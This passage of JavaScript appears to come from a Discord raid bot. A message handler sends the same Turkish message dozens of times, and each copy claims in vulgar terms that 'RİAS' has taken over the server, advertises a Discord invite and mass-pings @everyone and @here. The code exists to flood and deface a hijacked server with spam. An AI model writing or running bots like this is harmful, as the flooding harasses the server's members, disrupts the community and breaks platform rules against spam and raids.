      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

    );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"




         
     

      
    );
  }
});